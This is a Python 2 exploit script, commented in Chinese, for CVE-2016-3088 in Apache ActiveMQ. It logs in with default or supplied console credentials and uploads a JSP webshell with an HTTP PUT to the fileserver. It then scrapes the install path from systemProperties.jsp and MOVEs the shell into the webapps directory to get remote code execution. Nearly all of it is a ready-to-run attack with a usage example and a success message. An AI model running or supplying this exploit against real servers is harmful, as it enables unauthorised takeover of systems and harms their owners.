#!/usr/bin/env python
# -*- coding:utf-8 -*-
# ActiveMQ的PUT 上传getshellExP CVE-2016-3088
# Author:CF_HB
# 时间：2016年6月8日
# 漏洞参考地址: http://zone.wooyun.org/content/27737
#

import argparse
from urlparse import urlparse, urlunparse
import time
import socket
import base64
import traceback
import re
banner = u'''\
# ActiveMQ的PUT 上传getshellExP CVE-2016-3088
# Author:CF_HB
# 时间：2016年6月8日
# 漏洞参考地址: http://zone.wooyun.org/content/27737
#1.PUT上去
#2.找到路径
#3.Move Shell

# exp例子：
# 原理参见zone里白帽子刺刺的分析，上传shell用法如下：
    python ActiveMQExP.py -url http://192.168.18.133:8161/ -user admin -pass admin -shell D://shell.jsp
'''

class ActiveMqExpTool():
    def __init__(self):
        self.base_url = ""
        self.AuthBasic = "YWRtaW46YWRtaW4=" # 默认admin:admin
        self.host = "127.0.0.1"
        self.port = 8611
        self.put_file_path = "/fileserver/tmp_2016.txt"
        self.local_shell_path = ""
        self.move_shell_path = ""
        self.get_install_path_url ="/admin/test/systemProperties.jsp"
        self.install_path = ""
        self.webshell_path = "/api/tmp_2016.jsp"
        # PUT文件路径
        self.put_file_package = '''\
PUT #put_file_path# HTTP/1.1
Host: 192.168.18.133:8161
Cache-Control: max-age=0
Authorization: Basic #BASE64#
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 1.0; WOW64) Chrome/17.0.2526.106 Safari/5.6
Accept-Encoding: gzip, deflate, sdch
Destination: htt
Accept-Language: zh-CN,zh;q=0.8
If-Modified-Since: Wed, 06 Feb 2013 08:53:26 GMT
Content-Length: #SHELL_LENGTH#

->||<-#ShowMeShell#
'''
        #MOVE文件写shell地址
        self.move_file_package = '''\
MOVE #put_file_path# HTTP/1.1
Host: 192.168.18.133:8161
Cache-Control: max-age=0
Authorization: Basic #BASE64#
Destination:#move_shell_path#

'''
        self.check_file_packege = '''GET check_url HTTP/1.1\r\nHost: *.*.*.*\r\nAuthorization: Basic #BASE64#\r\n\r\n'''

    def connectsocket(self):
        try:
            socket.setdefaulttimeout(5)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_address = (self.host, int(self.port))
            sock.connect(server_address)
            return sock
        except Exception,e:
            print "Failed to connection target"
            return None

    def checkfile(self, checkurl):
        try:
            flag = False
            sock = self.connectsocket()
            check_uer_package = self.check_file_packege.replace("check_url", checkurl).replace("#BASE64#", self.AuthBasic)
            sock.sendall(check_uer_package)
            time.sleep(3)
            recv = sock.recv(500)
            # print recv
            if "->||<-" in recv:
                print "Check File : OK!!!"
                flag = True
            else:
                print "Check File : Wrong"
                flag = False
            sock.close()
            return flag
        except Exception, e:
            print "Check File : Wrong"
            print e
            sock.close()


    def getshell(self, url, username, password, shell_path):
        self.username = username
        self.password = password
        self.local_shell_path = shell_path
        urlinfo = urlparse(url)
        self.base_url = urlunparse((urlinfo.scheme, urlinfo.netloc, '', '', '', ''))
        self.host = urlinfo.netloc.split(":")[0]
        self.port = urlinfo.netloc.split(":")[1]

        # 第一步PUT上传文件
        base64_string = base64.b64encode(self.username+":"+self.password)
        self.AuthBasic = base64_string
        self.put_file_path = self.base_url+self.put_file_path
        check_url = self.put_file_path
        shellcpntent = open(self.local_shell_path, 'r')
        # 替换下换行
        shellcontent = shellcpntent.read().replace("\n", "")
        put_file_package = self.put_file_package.replace("#put_file_path#", self.put_file_path).replace("#BASE64#", self.AuthBasic).replace("#ShowMeShell#", shellcontent).replace("#SHELL_LENGTH#", str(len(shellcontent)+50))
        sock = self.connectsocket()
        sock.sendall(put_file_package)
        time.sleep(2)
        # put_recv = sock.recv(50)
        sock.close()
        # 检查PUT文件成功了没
        check_url = self.put_file_path
        if (self.checkfile(check_url)):
            print u"PUT文件成功"
        else:
            u"PUT文件失败"
            return
        # 第二步找到路径
        get_install_path_url = self.base_url+self.get_install_path_url
        # print "get_install_path_url = "+get_install_path_url
        get_install_path_packege = self.check_file_packege.replace("check_url", get_install_path_url).replace("#BASE64#", self.AuthBasic)
        get_file_sock = self.connectsocket()
        get_file_sock.sendall(get_install_path_packege)
        time.sleep(2)
        # 轮询socket读取数据
        recv =""
        while True:
            time.sleep(0.2)
            recv_temp = ""
            try:
                recv_temp = get_file_sock.recv(4096)
                if recv_temp == "":
                    break
                recv = recv + recv_temp
                continue
            except:
                if recv_temp == "":
                    break
                else:
                    recv = recv + recv_temp
                    continue
        # 很笨的办法寻找安装目录，在html里面找
        DirIndex = recv.index("user.dir")
        tempIndex = recv.index("line.separator")
        temptext = recv[DirIndex:tempIndex]
        remodle_one = re.compile(r'<[^>]+>')
        temp = remodle_one.sub("#", temptext)
        temp_list = temp.split("#")
        for k in temp_list:
            if "activemq" in k or "apache" in k:
                self.install_path = k
        # C:\apache-activemq-5.8.0-bin\apache-activemq-5.8.0\bin\win32
        # ['C:', 'apache-activemq-5.8.0-bin', 'apache-activemq-5.8.0', 'bin', 'win32']
        # self.install_path = "/opt/apach-activemq-5.13/bin/"
        path_list = self.install_path.split("\\")
        if len(path_list)==1:
            path_list = self.install_path.split("/")
        # 得到MOVE_PATH
        self.move_shell_path = self.base_url +"/" +path_list[1]+"/"+path_list[2]+"/webapps"+self.webshell_path
        print self.move_shell_path
        # 最后一步,MOVE得到shell
        move_file_package = self.move_file_package.replace("#put_file_path#", self.put_file_path).replace("#BASE64#", self.AuthBasic).replace("#move_shell_path#", self.move_shell_path)
        move_sock = self.connectsocket()
        move_sock.sendall(move_file_package)
        time.sleep(1)
        web_shell = self.base_url + self.webshell_path
        print "connecting web_shell... "
        if (self.checkfile(web_shell)):
            print u"[getshell success!]"
            print "SHELL: "+web_shell
        else:
            u"getshell 失败"
            return

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-url', help='the target url.')
    parser.add_argument('-user', help='username of console.')
    parser.add_argument('-pass', help='password of console.')
    parser.add_argument('-shell', help='your jsp webshell.')

    args = parser.parse_args()
    args_dict = args.__dict__
    try:
        print banner
        amexp = ActiveMqExpTool()
        url = args_dict['url']
        username = args_dict['user']
        password = args_dict['pass']
        shell = args_dict['shell']
        amexp.getshell(url=url, username=username, password=password, shell_path=shell)
    except Exception,e:
        print traceback.print_exc()
        print parser.print_usage()
        exit(-1)